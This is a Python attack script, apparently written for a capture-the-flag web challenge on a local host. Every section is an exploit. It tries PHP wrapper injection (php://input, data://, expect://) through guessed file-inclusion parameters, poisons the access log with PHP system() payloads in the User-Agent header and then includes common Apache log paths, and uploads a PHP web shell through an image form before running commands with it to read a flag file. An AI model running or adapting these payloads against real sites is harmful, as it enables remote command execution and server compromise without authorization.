import requests
import base64
import urllib.parse

base_url = "http://127.0.0.1:32824"

print("Testing RCE via LFI wrappers and log poisoning...")
print("=" * 60)

# 1. Try php://input wrapper to execute code
print("\n1. Testing php://input wrapper...")
param_names = ['file', 'include', 'page', 'inc', 'img', 'view']

php_code = "<?php system('id'); ?>"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

for param in param_names:
    url = f"{base_url}/index.php?{param}=php://input"
    resp = requests.post(url, data=php_code, headers=headers, timeout=5)
    if resp.status_code == 200 and ('uid=' in resp.text or 'www-data' in resp.text):
        print(f"[!] RCE via php://input on {param} parameter!")
        print(f"Output: {resp.text[:500]}")
        break

# 2. Try data://wrapper
print("\n2. Testing data:// wrappers...")
data_payloads = [
    ("data://text/plain;base64," + base64.b64encode(b"<?php system('id');?>").decode(), "base64"),
    ("data://text/plain,<?php echo shell_exec('whoami');?>", "plain"),
]

for param in param_names:
    for payload, ptype in data_payloads:
        url = f"{base_url}/index.php?{param}={payload}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and len(resp.text) < 1000:
            print(f"Response via data:// ({ptype}) on {param}: {resp.text[:500]}")
            if 'uid=' in resp.text or 'www-data' in resp.text or 'root' in resp.text:
                print(f"[RCE] Command execution confirmed!")

# 3. Test for expect:// wrapper (RCE via system commands)
print("\n3. Testing expect:// wrapper...")
for param in param_names:
    url = f"{base_url}/index.php?{param}=expect://id"
    resp = requests.get(url, timeout=10)
    if resp.status_code == 200 and len(resp.text) < 1000 and not 'Invalid Image' in resp.text:
        print(f"[RCE] expect:// wrapper working on {param}")
        print(f"Output: {resp.text[:500]}")

# 4. Log poisoning attempt
print("\n4. Testing log poisoning...")
poison_payloads = [
    "<?php system($_GET['cmd']); ?>",
    "<?php echo shell_exec($_REQUEST['cmd']); ?>",
    "<?php passthru($_GET['cmd']); ?>"
]

user_agents = [
    "<?php system('id');?>",
    "<?php echo 'HACKED';?>",
    "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>"
]

# Try to poison access log
for ua in user_agents:
    headers = {'User-Agent': ua}
    resp = requests.get(f"{base_url}/index.php", headers=headers)
    print(f"User-Agent poison attempt: {resp.status_code}")

# Now try to include the log file
log_files = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/access_log",
    "/var/log/httpd/access.log",
    "/var/log/httpd/access_log",
    "/var/log/apache/access.log",
    "/var/log/apache/access_log"
]

for param in param_names:
    for log_file in log_files:
        url = f"{base_url}/index.php?{param}={log_file}&cmd=id"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and 'uid=' in resp.text:
            print(f"[LOG POISONING SUCCESS] via {param}={log_file}")
            print(f"Output: {resp.text[:1000]}")
            # Now try to read flag
            flag_resp = requests.get(f"{base_url}/index.php?{param}={log_file}&cmd=cat%20/flag")
            if 'FLAG{' in flag_resp.text:
                print(f"[!] FLAG: {flag_resp.text}")
            break

# 5. Try to include uploaded shell with different path
print("\n5. Directly trying uploaded shell...")
# Upload a cleaner shell first
shell_php = b"""<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>"""
files = {'userfile': ('shell_clean.php', shell_php, 'application/x-php')}
data = {'submit': 'Upload Image'}
resp = requests.post(f"{base_url}/index.php", files=files, data=data)
print(f"Re-upload status: {resp.status_code}")

# Try to access via LFI
for param in param_names:
    url = f"{base_url}/index.php?{param}=upload/shell_clean.php&cmd=whoami"
    resp = requests.get(url, timeout=5)
    if len(resp.text) < 1000 and ('www-data' in resp.text or 'root' in resp.text):
        print(f"[RCE] via uploaded shell on {param}")
        print(f"Output: {resp.text}")
        # Try to get flag
        flag_resp = requests.get(f"{base_url}/index.php?{param}=upload/shell_clean.php&cmd=cat%20/flag")
        print(f"Flag: {flag_resp.text}")

print("\n" + "=" * 60)
print("Advanced RCE testing complete.")
